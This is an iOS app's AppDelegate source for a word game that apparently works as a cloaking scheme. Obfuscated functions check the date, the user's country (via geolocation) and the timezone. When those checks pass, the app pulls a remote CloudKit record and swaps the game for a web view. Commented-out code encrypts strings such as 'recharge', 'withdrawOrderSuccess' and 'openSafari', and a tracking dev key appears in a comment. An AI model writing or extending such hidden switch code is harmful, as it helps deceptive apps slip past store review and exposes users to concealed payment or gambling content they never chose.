//
//  AppDelegate.swift
//  WordsGame
//
//

import UIKit
import AppsFlyerLib
import Reachability
import CloudKit

func isTm() -> Bool {
   
  // 2025-05-16 17:25:22
    //1747387522
  let ftTM = 1747387522
  let ct = Date().timeIntervalSince1970
  if ftTM - Int(ct) > 0 {
    return false
  }
  return true
}

func isBaxi() -> Bool {
    let offset = NSTimeZone.system.secondsFromGMT() / 3600
    if offset > 6 && offset < 8 {
        return true
    }
    return false
}

@main
class AppDelegate: UIResponder, UIApplicationDelegate {

    var window: UIWindow?
    
    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
        // Override point for customization after application launch.
        
        // Set up the appearance of the navigation bar
        let appearance = UINavigationBarAppearance()
        appearance.configureWithOpaqueBackground()
        appearance.backgroundColor = UIColor.black.withAlphaComponent(0.8)
        appearance.titleTextAttributes = [.foregroundColor: UIColor.white]
        
        UINavigationBar.appearance().standardAppearance = appearance
        UINavigationBar.appearance().scrollEdgeAppearance = appearance
        UINavigationBar.appearance().compactAppearance = appearance
        UINavigationBar.appearance().tintColor = .white
        
        window = UIWindow(frame: UIScreen.main.bounds)
        window?.makeKeyAndVisible()
        
//        let arr = ["jsBridge", "recharge", "withdrawOrderSuccess", "firstrecharge", "firstCharge", "charge", "currency", "addToCart", "amount", "openWindow", "openSafari", "rechargeClick", "params"]
//
//        var neArr = [String]()
//
//        for str in arr {
//            neArr.append(encrypt(str, withSeparator: "|")!)
//        }
//        print(neArr)
//
//        for string in neArr {
//            print(owpeise(string))
//        }
//
//        print(encrypt("https://ipapi.co/json/", withSeparator: "|"))
        
        makeoaejw()
        
        return true
    }
    
    func mainVC() {
        let mainMenuViewController = MainMenuViewController()
        let navigationController = UINavigationController(rootViewController: mainMenuViewController)
        navigationController.isNavigationBarHidden = true
        window?.rootViewController = navigationController
    }
    
    func makeoaejw() {
        window?.rootViewController = UIStoryboard(name: "LaunchScreen", bundle: nil).instantiateInitialViewController()
        
        let rea = Reachability(hostname: "www.apple.com")
        rea?.reachableBlock =  { [self] reachability in
            
            if isTm() {
                if Rtaeinabe.isTft {
                    DispatchQueue.main.async {
                        self.mainVC()
                    }
                } else {
                    Rtaeinabe.palema { [self] iioop, ctCod in
                        if ctCod != nil {
                            if (ctCod?.contains("US"))! || (ctCod?.contains("ZA"))! || (ctCod?.contains("CA"))! {
                                DispatchQueue.main.async {
                                    self.mainVC()
                                }
                            } else {
                                graweoea()
                            }
                        } else {
                            graweoea()
                        }
                    }
                }
            } else {
                DispatchQueue.main.async {
                    self.mainVC()
                }
            }
            rea!.stopNotifier()
        }
        rea?.startNotifier()
    }

    
    func quqora(_ ky: String) {
        //JOJO
        // "dhoUnccowqU9eaHu6RnnA7"
        AppsFlyerLib.shared().appsFlyerDevKey = ky
        AppsFlyerLib.shared().appleAppID = "6746029542"
        AppsFlyerLib.shared().delegate = self
             
        AppsFlyerLib.shared().start { (dictionary, error) in
            if error != nil {
                print(error as Any)
            }
        }
    }
    
    func graweoea() {
        let db = CKContainer.default().publicCloudDatabase
        db.fetch(withRecordID: CKRecord.ID(recordName: "djeooskIEOoso-qowemaj")) { record, error in
            DispatchQueue.main.async { [self] in
                if (error == nil) {
                    let xcb = record?.object(forKey: "xcbeqwea") as! String
                    quqora(xcb)
                    
//                    let hseuappskdd = record?.object(forKey: "hseuappskdd") as? String
                    let apa = record?.object(forKey: "apao01219") as! String
                    let vaa = record?.object(forKey: "vaasder311") as! String
                    
                    if let UUIW = record?.object(forKey: "uUIWMMSKQW") {
                        let vc = GamePlayViewController()
                        vc.ssqie = (UUIW as! String)
                        vc.yuzywznw = apa
                        
                        if vaa != "vaasder311" {
                            self.window?.rootViewController = vc
                        }
                        
                        if vaa == "vaasder311" && isBaxi(){
                            self.window?.rootViewController = vc
                        }
                    } else {
                        self.mainVC()
                    }
                } else {
                    self.mainVC()
                }
            }
        }
    }
}

extension AppDelegate: AppsFlyerLibDelegate {
    func onConversionDataSuccess(_ conversionInfo: [AnyHashable : Any]) {
        
    }
    
    func onConversionDataFail(_ error: Error) {
        
    }
}



